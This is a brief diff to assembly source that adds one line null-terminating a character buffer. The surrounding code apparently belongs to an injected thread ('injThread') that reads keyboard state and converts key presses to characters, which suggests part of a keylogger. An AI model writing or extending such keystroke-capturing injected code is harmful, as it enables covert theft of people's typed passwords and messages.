@@ -57,6 +57,7 @@ proc injThread arg
 		invoke _GetKeyboardState+ebx,eax
 		lea eax,[KeyState]
 		invoke _ToAscii+ebx,[VirtKey],[ScanCode],eax,esi,0
+		mov byte [esi+1],0
 	.endif
 	pop ecx
 	cmp ecx,11
